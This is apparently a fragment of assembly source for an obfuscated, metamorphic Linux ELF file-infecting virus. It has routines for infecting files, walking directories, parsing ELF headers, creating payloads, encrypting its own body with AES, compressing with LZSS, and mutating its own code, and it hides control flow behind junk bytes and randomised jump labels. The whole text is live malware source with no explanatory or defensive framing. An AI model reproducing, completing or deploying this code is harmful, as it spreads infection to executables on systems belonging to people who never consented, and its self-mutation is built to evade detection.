..@en0GzjeQGjgC:
    mjmp        ..@wsVZmx0Be7FL
db 0xb5, 0xb4, 0xa5
..@wsVZmx0Be7FL:
    mjmp        ..@ChqbvXH7BSxV
db 0xfe
..@ChqbvXH7BSxV:
    mjmp        ..@cNA1uqoAMi53
..@i9ckTbEmEDbY:
    call        ConvertAddToSub
    mjmp        ..@Tcqv47H00Ft7
..@RI0pL2AcrkNW:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mjmp        ..@hHLBNbU8XV87
..@kEHUKjuXs771:
    ret
    mjmp        ..@voaxkJkpHVBd
db 0xfe
..@voaxkJkpHVBd:
    mjmp        ..@bEDDeoZ7EtLR
db 0x47, 0x98, 0x11
..@bEDDeoZ7EtLR:
    mjmp        ..@lfV9RFWzWsE2
..@PJyTZJW4fkBK:
    jz          ..@xOgHm4JUJKpM
    mjmp        ..@00ZlnOrw0SRE
db 0xe2, 0xff, 0xe7
..@00ZlnOrw0SRE:
    mjmp        ..@fefO0AIub4SA
db 0xfe
..@fefO0AIub4SA:
    mjmp        ..@MtSe752hz7EO
..@pgNpEHLJyuZi:
    xor         rax, rax
    xchg        rsp, rsp
    mjmp        ..@W7jB9Naz3vmF
..@qHEAPfiHChlO:
    xchg        rax, rax
    mjmp        ..@2UEmWWM9wlNK
db 0xfe
..@2UEmWWM9wlNK:
    mjmp        ..@RVvXIDRv6kMv
..@3hkm4EyVxoaz:
    mov         bl, 58h
    mjmp        ..@rJfNBbT7kvUV
db 0xf3, 0xc1, 0x0c
..@rJfNBbT7kvUV:
    mjmp        ..@eciNW9WFZGNm
db 0xb0, 0x94
..@eciNW9WFZGNm:
    mjmp        ..@VZzj6PLBd56h
..@YYE52nUaB9e0:
    push        rcx
    mjmp        ..@XinsdpqqgoZA
db 0xa9, 0x15
..@XinsdpqqgoZA:
    mjmp        ..@zTYjRAkrcERr
db 0x30
..@zTYjRAkrcERr:
    mjmp        ..@pCWc28Rsy5gW
db 0xde
..@pCWc28Rsy5gW:
    mjmp        ..@2FkcCxqfEwxe
..@3dgW9ly77U44:
    movr        rbx, rbx
    mjmp        ..@GG26lLFzJLVF
..@g4IR9dWxIGe5:
    rep         cmpsb
    mjmp        ..@n6X6CFNHXrfH
..@MLCfK2w1dDrk:
    jz          ..@nnoKf6qA5x7D
    mjmp        ..@8ZrUNRbndASL
..@TgHzXITaUHzO:
    syscall
    cmp         rax, 0x0
    jle         ..@hJQ9YOYGY6lt
    movr        rax, rsp
    mjmp        ..@0HnPsu4vLq24
db 0x32, 0xac
..@0HnPsu4vLq24:
    mjmp        ..@HEbMfzXy4Mop
db 0xe7
..@HEbMfzXy4Mop:
    mjmp        ..@iAYUK9003zPl
..@bYeXSCYPTJtR:
    rep         nop
    mjmp        ..@K6INJJgtbyqn
..@jlznS5kTon15:
%ifdef X86_64
    push        rax
%endif
    mjmp        ..@Qu1ZaZ78lCsg
..@8mQWz4Vv2Uvz:
    xor         rbx, rbx
    movr        rdi, rsi
    mjmp        ..@nWufMGtzLmWW
..@HK3Xm3capzdm:
    mov         r1, QWORD [r5+file.fileptr]
    add         r1, signature_reg_len-1
    mjmp        ..@Fr9YC372Pefx
db 0x99
..@Fr9YC372Pefx:
    mjmp        ..@bBGnojJSv1kO
..@K5WAU6lNp2sA:
    jle         ..@y1DBTlVDBAUC
    mjmp        ..@MIdkDyh7ZecY
..@frZgbrQw9mWK:
%ifdef X86_64
    movr        rdx, r10
    movv        r10, 0x01
%endif
    mjmp        ..@ZPXTSBE9sZen
..@hh7rHleCJAOu:
    call_vsp    ExitProgram
    mjmp        ..@uOdPwxBFRHFR
..@nnoKf6qA5x7D:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    mjmp        ..@yVtUe5UK0nbW
db 0xc7, 0xc2
..@yVtUe5UK0nbW:
    mjmp        ..@PBvDehCPTyj8
..@uFWv8Xe0ptJg:
    xchg        rsi, rsi
    xor         rcx, rcx
    xor         rbx, rbx
    xor         rdx, rdx
    mjmp        ..@AB6fkkPYSm5s
db 0x43, 0x42
..@AB6fkkPYSm5s:
    mjmp        ..@e9i30jTxwMtR
db 0xa3, 0x42, 0xa3
..@e9i30jTxwMtR:
    mjmp        ..@MBtlF9p3dceU
..@NjZ3Tl1yQzqI:
%ifdef X86_64
    pop         rsi
%endif
    mjmp        ..@pco5vtSSx6ta
..@TdFNA7yMwyBH:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    mjmp        ..@EeoO4KTVxis5
..@ZouOxRNU3rCg:
%ifdef X86_32
    pop         rdi
    cmp         dl, 05h
    je          ..@EuaGjmwM9vTp
    cmp         dl, 2dh
%endif
    mjmp        ..@dN09imaAQ9bf
..@yHnUz1Dr3C3J:
    xchg        rsi, rsi
    mjmp        ..@YdmLedxZXM0Q
db 0xa2, 0x15, 0x26
..@YdmLedxZXM0Q:
    mjmp        ..@aJIxCIX0ozKf
..@OG4XbNSViqTF:
    cmp         BYTE [r5], DT_REG
    jne         ..@amSjgXHWBguE
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mjmp        ..@WhqBjDc5Tec3
InfectionRoutine:
    mjmp        ..@MbZrZGUgLg5V
MemMove:
    mjmp        ..@u3am8hosKJzl
..@90moBuhVraTP:
    xor         rcx, rcx
    xor         rbx, rbx
    xor         rdx, rdx
    mjmp        ..@xBPoGqm0IkSB
db 0x0c, 0xf4, 0x36
..@xBPoGqm0IkSB:
    mjmp        ..@6vTFHX9VPioe
..@MrpVYsNFh0Um:
    movdqu      xmm0, [rsi+rcx]
    movdqu      xmm1, oWORD [rsp]
    pxor        xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x10]
    mjmp        ..@MmQQytK7D5j9
db 0x44, 0x9f
..@MmQQytK7D5j9:
    mjmp        ..@mIDAK5Dew2AS
..@UjgWhuCtsh9G:
    xchg        rdx, rdx
    mjmp        ..@6GT9gWcdIDJT
ConvertJumpToDoubleJump:
    mjmp        ..@c8eilWcuVaqB
..@FOjHOQF90m3X:
    push        rax
    pop         rax
    mjmp        ..@YNl8o75GxpJC
db 0x20, 0xca
..@YNl8o75GxpJC:
    mjmp        ..@La3bXjkS72Yf
..@nWufMGtzLmWW:
    add         rdi, rcx
    mjmp        ..@oE8RsCf0y6Vv
..@WdfA4oWkSoPf:
    inc         WORD m5
    mjmp        ..@H5SZSLu9Z8uM
db 0xdc, 0x3f
..@H5SZSLu9Z8uM:
    mjmp        ..@VZxHGDlHGjsl
db 0x04, 0x04, 0x2f
..@VZxHGDlHGjsl:
    mjmp        ..@GEjeDitjDxWC
..@l345bb66GdKM:
    movv        rax, 0x00
    rep         stosb
    mov         r2, QWORD [rsp+_UPDATASIG_OFF.meta_ptr+0x20]
    mjmp        ..@8OLRYC4C40Sg
..@6vAqC4XWlsaI:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    mjmp        ..@ieVhvfujbHV1
..@lKxMI9NfsZSD:
%ifdef X86_64
    mov         bx, 5841h
%endif
    mjmp        ..@xXR9V2JdfItu
..@LZTb859rcH9n:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_EXECVE
    movr        rcx, rcx
    syscall
%endif
    mjmp        ..@JlcA1GNKzDUE
db 0xd5
..@JlcA1GNKzDUE:
    mjmp        ..@JwGWJAHKEZn4
db 0x9e, 0xc6, 0xf2
..@JwGWJAHKEZn4:
    mjmp        ..@oV72sP23tEIW
db 0xc3, 0x1b
..@oV72sP23tEIW:
    mjmp        ..@3eMzvMToLeUr
..@vvjWEbyVn7K6:
    xchg        rdi, rdi
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    mjmp        ..@ip0HuYgOP0MF
db 0xd0, 0x92, 0x32
..@ip0HuYgOP0MF:
    mjmp        ..@nfkhnWSUL7kJ
..@9uOkaWycDHHq:
    movv        rax, 0xff
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    mjmp        ..@kNg2LgkTa8D9
..@1QTNc9nNUB7X:
    movr        rsi, rsi
    xchg        rsi, rsi
    movr        rbx, rbx
    mjmp        ..@673pNbPcOLae
..@JgmmOPQYuyXz:
    push        rbx
    pop         rbx
    mjmp        ..@ptzHh92VwB1I
..@NLMPXuC2BFAI:
%ifdef X86_64
    or          rdi, rax
%endif
    mjmp        ..@vOoxjFKRYI15
db 0x00, 0x03
..@vOoxjFKRYI15:
    mjmp        ..@aMZ3t52W9pX0
..@MLc6umSu6pgL:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
%endif
    mjmp        ..@xcRdyCuv5ScW
db 0x10
..@xcRdyCuv5ScW:
    mjmp        ..@t3a6B1hUkYbG
..@iZvIRoJOQwsV:
    cmp         rax, r2
    mjmp        ..@4jGUJaZ4FlEU
db 0xf9
..@4jGUJaZ4FlEU:
    mjmp        ..@qSK67sPm3tMX
db 0xda
..@qSK67sPm3tMX:
    mjmp        ..@3VPbCJboYf9c
..@Gh4VIiYWhm7f:
    rep         nop
    xchg        rdi, rdi
    mov         WORD [rdi+9], 9090h
    mov         BYTE [rdi+11], 90h
    mjmp        ..@BBgyTrdUTWJ1
db 0xa8
..@BBgyTrdUTWJ1:
    mjmp        ..@8ZMFsJGV8FV5
db 0x08
..@8ZMFsJGV8FV5:
    mjmp        ..@jW2SzhQFoRQ5
..@GkOt1RV7VMVc:
    add         rsp, _INFFILE_OFF_size
    mjmp        ..@JX8IaCGqwfjx
..@UyQUN95dH9lN:
%ifdef X86_64
    shl         rbx, 8
%endif
    mjmp        ..@SYIp69WY5x2S
..@t1LercbH82nj:
    movr        rax, rdi
    ret
    mjmp        ..@wh2hzP9QuID7
db 0x02, 0x2a
..@wh2hzP9QuID7:
    mjmp        IsNum
..@A9C4DonBw7sV:
    xor         rax, rax
    movr        rbp, rbp
    mjmp        ..@x4NmJqfLiI8O
..@DbgrA230CyHU:
    movv        r3, _decrypt-_virus
    call_vsp    Aes256KeyCreation
    mov         r1, m6
    add         r1, non_encrypted_len
    mov         r2, m7
    mjmp        ..@mNPSeWw6ir52
db 0x13, 0xdd, 0x4a
..@mNPSeWw6ir52:
    mjmp        ..@j6BQooYV93FF
..@Gi3V1LGJQlwg:
    rep         nop
    mjmp        ..@T2vnnN0Htpb2
    mjmp        ..@2XwBQZR5Nu6L
db 0x19, 0x12, 0xa6
..@2XwBQZR5Nu6L:
    mjmp        ..@R2fer8tAAfju
db 0xa5, 0x9e, 0xd8
..@R2fer8tAAfju:
    mjmp        ..@V6b3XgQRkmNP
db 0xda, 0x1f
..@V6b3XgQRkmNP:
    mjmp        ..@gjBFtsRvymPD
..@VK95Z0VdicLj:
%ifdef X86_64
    push        rsi
    pop         rsi
    and         edx, 0f8fff8ffh
    cmp         edx, 58415041h
%endif
    mjmp        ..@LfTLXZWrhP0n
db 0x00
..@LfTLXZWrhP0n:
    mjmp        ..@r5q11P9nJWYG
..@7OsF0nEAbttC:
%ifdef X86_32
    je          ..@p1TRtLd8XYZN
%endif
    mjmp        ..@WsE6iBVFNBxL
db 0xfc, 0x4e, 0x0e
..@WsE6iBVFNBxL:
    mjmp        ..@gPQUWPvYcSJk
db 0xa1, 0xd4
..@gPQUWPvYcSJk:
    mjmp        ..@KcMprkyn36R0
db 0xc4, 0x1a, 0x2b
..@KcMprkyn36R0:
    mjmp        ..@FCvTq7zQys94
..@z38ie45uQaLf:
    movr        rdi, rdi
    push        rbx
    pop         rbx
    mjmp        ..@H5QiZM7gIijK
..@NjlpBo6Il35a:
    movr        rsi, rsi
    mjmp        ..@7PcVlheQzuUA
db 0xc6
..@7PcVlheQzuUA:
    mjmp        ConvertXorToMoveZero
..@Qo5JDoS5vE03:
    mjmp        ..@Gz2Q9TpFbeAg
    mjmp        ..@FVoc4o7Ix3dq
db 0xe1, 0x34, 0x1f
..@FVoc4o7Ix3dq:
    mjmp        ..@XdXIeWcpFde5
..@DJyrSgMeuVoc:
%ifdef X86_32
    pop         ebp
%endif
    mjmp        ..@261YPP9x13wy
..@Gd4HrWY4IZbY:
%ifndef ENABLE_DEBUGGING
    syscall
    sub         r2, 1
    cmp         r2b, 0x0
    jge         ..@Dm3ZHBwZafgE
    xor         rax, rax
%endif
    mjmp        ..@kX7KCoXZwH2W
..@Ijq7YgEtMHSb:
%ifndef ENABLE_DEBUGGING
    push        rbx
    pop         rbx
    syscall
%endif
    mjmp        ..@MLc6umSu6pgL
..@mddElCvfR1zW:
    mov         rcx, QWORD [rsp]
    mjmp        ..@EEEHKZszNOHo
db 0x69
..@EEEHKZszNOHo:
    mjmp        ..@nuZT3VcRZka0
..@ofXYODv7UPud:
    add         rsp, _KEYGEN_OFF_size
    pop         r3
    mjmp        ..@SDCNREIb1zfi
db 0xa9, 0x00, 0xae
..@SDCNREIb1zfi:
    mjmp        ..@kBBF0xRrY3Gc
db 0xc7
..@kBBF0xRrY3Gc:
    mjmp        ..@7is1dBaPq5xF
..@bUK7cvL0kjgP:
    movv        r3, 0x20
    mjmp        ..@qttRNIQgXvkI
db 0x16
..@qttRNIQgXvkI:
    mjmp        ..@XXBvmw9NVwE2
db 0x4b
..@XXBvmw9NVwE2:
    mjmp        ..@lIWm9WZFZv18
..@2QJpwdAetnK9:
    xor         rax, rax
    mjmp        ..@JCSzp3In8nWO
db 0x96, 0x9c
..@JCSzp3In8nWO:
    mjmp        ..@MnWNmWimmPdO
..@vmvNz81sBhiM:
%ifdef X86_64
    test        al, al
%endif
    mjmp        ..@OhKN6rLXa0B3
..@sGd8dOvCApY6:
    mjmp        ..@sFHQIKwsAbER
    mjmp        ..@EuaGjmwM9vTp
..@AufHi4nkVHhn:
    push        rbp
    mov         rbp, [rbp]
    mjmp        ..@hMUMHrISW25P
db 0xfc, 0xca, 0x23
..@hMUMHrISW25P:
    mjmp        ..@G19exWj9KFTg
db 0x4b
..@G19exWj9KFTg:
    mjmp        ..@nlqC4td1JcAN
..@lHj9xAR9npF3:
    add         rdi, _signature.key_preview-_signature.start
    movr        rsp, rsp
    mov         DWORD [rdi], eax
    rep         nop
    mjmp        ..@FJWEPGSqfQTJ
db 0x19, 0x06
..@FJWEPGSqfQTJ:
    mjmp        ..@skrbG892BwwJ
..@i1dPr4dgRXfn:
    lea         r1, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    mjmp        ..@ItRjjfxPfYmW
..@DULHA73DRfIb:
    and         dl, 1110b
    or          dl, 70h
    sub         ecx, 2
    mjmp        ..@u03RbQsVIxWC
..@z88Sth3apGNu:
%ifdef X86_64
    xor         rax, rax
    push        rcx
    pop         rcx
    xor         rdi, rdi
%endif
    mjmp        ..@YIyygJSw3mIk
..@lQhJ1g2JYUlK:
    call        DestroyPayload
    push        rax
    pop         rax
    mjmp        ..@WpAkY0UZTXfO
db 0x26, 0x2a
..@WpAkY0UZTXfO:
    mjmp        ..@sOBPWgOqjkfL
db 0x6f, 0x62
..@sOBPWgOqjkfL:
    mjmp        ..@y1DBTlVDBAUC
..@uqnnNDyKjPUE:
    rep         nop
    mjmp        ..@Rlq43jz2EXQb
..@LHkf5gDIOBgS:
    sub         rsp, _DYNPIE_OFF_size
    xchg        rsp, rsp
    mjmp        ..@5gJdzuhrIWFy
db 0x96
..@5gJdzuhrIWFy:
    mjmp        ..@Mb4sKldCNTpV
db 0xde, 0x65, 0x6c
..@Mb4sKldCNTpV:
    mjmp        ..@nLQk4v1WiGYc
..@e7sXD4kede3G:
    push        rsi
    push        rcx
    xor         rax, rax
    xor         rdx, rdx
    mjmp        ..@8mQWz4Vv2Uvz
..@32C0aIR90Hbr:
    xor         rax, rax
    mjmp        ..@U1EQ0LjRd6tv
db 0xc9, 0x2f
..@U1EQ0LjRd6tv:
    mjmp        ..@u9zwHonnSb9Z
..@X9ZG8WQY03pS:
    add         rdi, rax
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    mjmp        ..@gOvuB3KZVePZ
db 0xd4
..@gOvuB3KZVePZ:
    mjmp        ..@T0nJ9mTIvFDq
db 0x9f
..@T0nJ9mTIvFDq:
    mjmp        ..@QvqbwABSmY14
db 0xa4, 0xe8, 0x98
..@QvqbwABSmY14:
    mjmp        ..@WZ5d7KWdgHBB
..@MxuxXWS6AO4u:
    xor         rax, rax
    mjmp        ..@90moBuhVraTP
..@2YDvWisJbsaJ:
    add         ecx, 1
    cmp         ecx, DWORD [rsp+_MUTA_OFF.size]
    mjmp        ..@8elQHt3HRGCv
..@vrf9iPZs4pec:
    shr         ecx, 8
    and         ecx, 0ffh
    cmp         cl, 0x7f
    mjmp        ..@w452R6vwZXi7
db 0xdb, 0xaf, 0xf7
..@w452R6vwZXi7:
    mjmp        ..@YJKtZUGtsjQZ
db 0xce
..@YJKtZUGtsjQZ:
    mjmp        ..@LGswyJUdB3PO
..@5mgVUNAgmqJx:
    or          edi, eax
    mjmp        ..@SVQWd58t6PXz
..@BzyyiIzUVyY3:
    ret
    mjmp        ..@vbjeig0Snbeg
db 0xfc, 0x30, 0x26
..@vbjeig0Snbeg:
    mjmp        ConvertJumpToDoubleJump
..@u9zwHonnSb9Z:
    CFILE       DWORD [r5+file.filefd]
    mjmp        ..@jvSFVzHJGHu5
db 0x19, 0xf2
..@jvSFVzHJGHu5:
    mjmp        ..@E02ZhRAnI4WF
db 0xc8
..@E02ZhRAnI4WF:
    mjmp        ..@LxaNH3VI6hIg
..@0QRrhenGHFrI:
    xor         rcx, rcx
    movv        rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer] 
    mjmp        ..@B4Xe14l5pjOY
..@bmfh2uMBv8EQ:
    add         rdi, 5
    mjmp        ..@cYnruQNt7bHH
..@NAz9VoEB8dmL:
%ifndef ENABLE_DEBUGGING
    push        rdi
%endif
    mjmp        ..@OElwMlucAwCa
..@InspLkTgiA1T:
%ifdef X86_64
    cmp         dx, 2d48h
%endif
    mjmp        ..@Fsi4HCJTz3UI
..@vtXRGFWUKZpC:
    je          ..@wIVR8kZ4xY8R
    mjmp        ..@4Sd0fTM1XqFA
..@hX0XXituztHE:
    ret
    mjmp        ..@Gz2Q9TpFbeAg
..@1z7fHI5NffFb:
    xor         rax, rax
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    xchg        rdx, rdx
    or          BYTE [rsp+_LZSSE_OFF.bits], al
    mjmp        ..@NmuCJzZLSqEk
db 0xc2, 0xa4
..@NmuCJzZLSqEk:
    mjmp        ..@zXojX6kX6sCL
..@IlTWo05lUgyZ:
    cmp         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    mjmp        ..@4XMXnoNCHYbS
db 0xa3
..@4XMXnoNCHYbS:
    mjmp        ..@jvLRWXUnIxJ5
..@BAiBjhHIKVLC:
    xchg        rdx, rdx
    pop         rcx
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    mjmp        ..@EyusWVDGwGw6
db 0xd3, 0xc3, 0xdd
..@EyusWVDGwGw6:
    mjmp        ..@JRSU7iQdIRlU
db 0xe8, 0x96
..@JRSU7iQdIRlU:
    mjmp        ..@mLCj5GQV4QWe
..@KBDB2j1y7kZQ:
    jl          ..@LxaNH3VI6hIg
    movr        r4, r5
    mjmp        ..@0lmb2156AYeM
db 0x1d, 0xfc
..@0lmb2156AYeM:
    mjmp        ..@RxrJFwe4UuFk
..@pswpCDVtJ8IG:
    pop         rdi
    mjmp        ..@kt42jFplPioy
db 0x3c, 0x2c, 0xce
..@kt42jFplPioy:
    mjmp        ..@G85S2YhZRasy
..@nrEz6eNXEdkt:
    movr        rbp, rsp
    mjmp        ..@KEQFrkLu6oPW
..@NSPE61sBo25J:
    and         edx, 000000f8h
    mjmp        ..@nFGpx2AptB7i
db 0xec
..@nFGpx2AptB7i:
    mjmp        ..@tJH18hFMnide
..@OHrtqeCYND1W:
    pop         rdx
    cmp         edx, 000000b8h
    mjmp        ..@qAK3v6Bu6sY5
..@q33n7vJ6zgaJ:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    xchg        rsi, rsi
    movr        r3, rax
    and         r3, 0xfff 
    mjmp        ..@54ZnkFyAtQ0Q
db 0x06, 0xd5
..@54ZnkFyAtQ0Q:
    mjmp        ..@CXbuhya1ramU
db 0xe0
..@CXbuhya1ramU:
    mjmp        ..@EtYB2boqerdj
..@httD9Iv1q2kD:
    call_vsp    Aes256KeyCreation
    mjmp        ..@IAIT3XG2lF1O
..@f4MZ9rOn5IGf:
    add         rdi, 2
    movr        rbx, rbx
    mjmp        ..@cYnruQNt7bHH
    mjmp        ..@B1o4WTKPHMfV
..@tUIRHWRd22Zl:
    and         dx, 0f0ffh
    mjmp        ..@LlgZRR6ItOjA
..@tOO9wjzutJB0:
    pop         rcx
    mjmp        ..@sleZN79W2xan
db 0xf2
..@sleZN79W2xan:
    mjmp        ..@OfhrIXLBvjJq
..@lIWm9WZFZv18:
    movv        rax, SYS_READ
    syscall
    mjmp        ..@BTzb7WVpoEsb
db 0xfb, 0xa6, 0x2c
..@BTzb7WVpoEsb:
    mjmp        ..@u78sfScGwuLZ
..@8EJeaLLJvEZK:
    xor         rax, rax
    mjmp        ..@3thRpZxq3KSF
..@kl1T9f8oElm8:
    and         edx, 0fffffff8h
    mjmp        ..@Z48sVuE7bCvu
db 0xb3
..@Z48sVuE7bCvu:
    mjmp        ..@Ou41kx8460NB
db 0x3f
..@Ou41kx8460NB:
    mjmp        ..@12jd1F8tTbKj
..@szl6bkv1FvxU:
    xor         r1, r1
    mjmp        ..@yGOmTHOlLF42
db 0x91, 0x29, 0xd3
..@yGOmTHOlLF42:
    mjmp        ..@mWWPCXqTh6PK
..@TwFmboXisgik:
    pop         rcx
    mjmp        ..@OUmKz6suixym
..@dh7W0BYsCGvY:
    mov         rdi, m6
    mjmp        ..@DGZ4iKadnzmL
..@wrzFB1eFpIE4:
    push        r1
    mjmp        ..@jhEJy1oQnI08
..@icPrk1smGaOS:
%ifdef X86_32
    shr         edx, 8
    movr        rsp, rsp
    push        rcx
%endif
    mjmp        ..@VC5k82M0dzTA
..@EG8AkZIPWKPb:
%ifdef X86_32
    xor         ebp, ebp
%endif
    mjmp        ..@Fps3n7XFZ5Wq
db 0x4d, 0x3c, 0xde
..@Fps3n7XFZ5Wq:
    mjmp        ..@aew0yfQo8N67
..@RVvXIDRv6kMv:
    movr        rbx, rsi
    mjmp        ..@oTNE7Q5S5QM7
db 0x29, 0xcd, 0x45
..@oTNE7Q5S5QM7:
    mjmp        ..@l5cvn66dLLll
..@apReHxgPr0MB:
    pop         rax
    mjmp        ..@IM1kx74cj7wM
db 0xe7, 0xec, 0x60
..@IM1kx74cj7wM:
    mjmp        ..@gOt3IikBr2kO
..@ynWa8eAfILqF:
    add         rdi, rcx
    mjmp        ..@gbvw6cKFTU0w
..@3eMzvMToLeUr:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    mjmp        ..@TRzbiHpI3tcF
db 0x64
..@TRzbiHpI3tcF:
    mjmp        ..@A6AlLJYMysLr
..@VGBErXxiamib:
%ifdef X86_64
    and         edx, 0fff8f8ffh
    cmp         edx, 90585041h
    je          ..@p1TRtLd8XYZN
    mov         edx, DWORD [rdi]
    and         edx, 0fffff8f8h
%endif
    mjmp        ..@vE5lx9xOEYbq
db 0xb2, 0xfd, 0x6e
..@vE5lx9xOEYbq:
    mjmp        ..@9rMSLvjOCEMO
..@fnHwr4Gh6h8x:
    xor         rdi, rdi
    mjmp        ..@lkMsYp91T4cl
db 0x4d
..@lkMsYp91T4cl:
    mjmp        ..@vfj0o09xxBsY
db 0x44, 0x2f, 0xae
..@vfj0o09xxBsY:
    mjmp        ..@iw8A0itzv7UD
db 0xa7, 0x23, 0x25
..@iw8A0itzv7UD:
    mjmp        ..@2l5YHcvv9fYa
..@Cp0rNmLz7V00:
    push        rdx
    pop         rdx
    cmp         r2d, '../'
    mjmp        ..@2HJZMF4MMYbi
db 0x09
..@2HJZMF4MMYbi:
    mjmp        ..@EltyOzCexn6M
db 0x6d, 0xf9
..@EltyOzCexn6M:
    mjmp        ..@JnAgTGhPCQW6
..@TvKPbXM2e4gP:
    mjmp        ..@W7jB9Naz3vmF
    mjmp        ..@TAQ66JFI0mKI
db 0xf7, 0x4f, 0xe8
..@TAQ66JFI0mKI:
    mjmp        ..@pgNpEHLJyuZi
..@WxTyGMPaTfyk:
    movr        rax, rax
    movr        r2, r1
    add         r1, signature_len
    mov         r3, QWORD [r5+file.filesize]
    mjmp        ..@qopoFAayq9yw
db 0xa9, 0x6d, 0x37
..@qopoFAayq9yw:
    mjmp        ..@gl4l9in4tPkN
db 0x9a, 0x17
..@gl4l9in4tPkN:
    mjmp        ..@np1dzzX7mpYQ
db 0xb2, 0xa3, 0xd7
..@np1dzzX7mpYQ:
    mjmp        ..@ycdZZSKol5p4
..@DYiCKX6PWMqR:
    movr        rax, r4
    movzx       r3, WORD [r1+e_h.e_phentsize]
    mjmp        ..@57R2hx5tWn5o
..@xOgHm4JUJKpM:
    mov         bl, BYTE [rsi]
    not         bl
    mjmp        ..@DEd3w6htTNAD
..@xOI8ZBArOYN9:
    push        rdi
    movr        rdx, rdx
    mjmp        ..@dksqk0TlkR0T
db 0xa7, 0x3b
..@dksqk0TlkR0T:
    mjmp        ..@FOjHOQF90m3X
..@hYyraybh702x:
    xor         r4, r4
    mjmp        ..@MKdUGwOiFXqA
db 0x26, 0xc8
..@MKdUGwOiFXqA:
    mjmp        ..@NDvhEcM9y2y3
db 0xc1
..@NDvhEcM9y2y3:
    mjmp        ..@mpUD3imx8Xju
..@y1DBTlVDBAUC:
    lea         r1, [rsp+_INFFILE_OFF.file]
    mjmp        ..@64qQ8NK4MVEp
..@64qQ8NK4MVEp:
    xchg        rax, rax
    mjmp        ..@G7MkepFKBLVm
db 0x6e, 0x4e
..@G7MkepFKBLVm:
    mjmp        ..@Gh0QsUai043y
..@KCj1hdUNAVwE:
    movv        rax, (-1)
    mjmp        ..@nCmEtxGD7zDp
..@ZmLWLBeoAcem:
    xchg        rsp, rsp
    mjmp        ..@aGQQKqtttVrJ
db 0x44
..@aGQQKqtttVrJ:
    mjmp        ..@OU9a5HzdVi0b
db 0xce, 0x1d, 0x95
..@OU9a5HzdVi0b:
    mjmp        ..@09es2YLupEDF
db 0x2c
..@09es2YLupEDF:
    mjmp        ..@JW6z2FFZzY3L
..@9AAIozxkLBa6:
    call        ConvertMoveToPushPop
    movr        rbx, rbx
    mjmp        ..@mkA990qiJU6f
db 0x21
..@mkA990qiJU6f:
    mjmp        ..@VKNMwfXLQQQj
..@nLQk4v1WiGYc:
    xor         rax, rax
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    mov         ax, WORD [r1]
    mov         WORD [rsp+_DYNPIE_OFF.shentsize], ax
    mjmp        ..@EaJuRcOhaUg0
db 0xe1, 0x27
..@EaJuRcOhaUg0:
    mjmp        ..@FoxzIsab9LFD
..@CVaz7rN2UqAk:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jz          ..@ptzHh92VwB1I
    call        ConvertDoubleJumpToJump
    push        rdi
    mjmp        ..@f5OobA4etIwx
db 0xf3, 0xd6, 0xc6
..@f5OobA4etIwx:
    mjmp        ..@PwZEpBtF1Lgs
db 0xe3, 0x67, 0x69
..@PwZEpBtF1Lgs:
    mjmp        ..@no9YMbW3bZKZ
..@GMXSGhknTWwR:
    push        r5
    xor         r4, r4
    mjmp        ..@8vb5452dX1Kl
..@lZYuZbXWGxiB:
    mov         r2, m5
    call        CreatePayload
    pop         r3
    pop         r2
    pop         r1
    mjmp        ..@9e6wT0uhaTOx
db 0xf5, 0xf8
..@9e6wT0uhaTOx:
    mjmp        ..@xOI8ZBArOYN9
..@sxFUMGTdHvgU:
    mov         r4, m6
    mjmp        ..@clLN03X6IAVo
db 0xc8, 0x09, 0x3f
..@clLN03X6IAVo:
    mjmp        ..@VOENFj03P3xs
..@sXhYV9Knby9o:
    aesenc      xmm0, xmm1
    mjmp        ..@sH6DMJI5T2AP
db 0x13
..@sH6DMJI5T2AP:
    mjmp        ..@p88T5G6Dnui6
db 0xa2, 0x12, 0x20
..@p88T5G6Dnui6:
    mjmp        ..@eaj15fdpvp0G
..@oD14a0gH3pO5:
    pop         rcx
    pop         rsi
    movv        rax, (-1)
    push        rsi
    pop         rsi
    mjmp        ..@BzyyiIzUVyY3
..@mmyHlI2iJ8Rx:
    mov         rax, [r5+file.filesize]
    add         rax, r2
    movr        r2, rax
    movv        rax, SYS_FTRUNCATE
    syscall
    mjmp        ..@DUrb4AGJGhzn
..@FDFDT6JK3RCm:
    test        al, al
    jz          ..@7XEsTO90nAlO
    call        ConvertMoveZeroToXor
    mjmp        ..@RlxzuI0P6cNL
db 0xda
..@RlxzuI0P6cNL:
    mjmp        ..@Ar7SUdk5y6Bh
db 0x4b, 0xd0, 0x3b
..@Ar7SUdk5y6Bh:
    mjmp        ..@VbJnaisC6DoM
db 0x47
..@VbJnaisC6DoM:
    mjmp        ..@b8fCsi8wtoUV
db 0x07, 0x6d
..@b8fCsi8wtoUV:
    mjmp        ..@7XEsTO90nAlO
ConvertMoveValueToPushPopValue:
    mjmp        ..@Ag5IFIjhYvtQ
..@UZRNlDBfgf7X:
    pop         rdx
    mjmp        ..@vrnybZDjnlyN
db 0xde
..@vrnybZDjnlyN:
    mjmp        ..@RgLGE671EuYI
..@yiW9eO2OxL8O:
    std
    rep         movsb
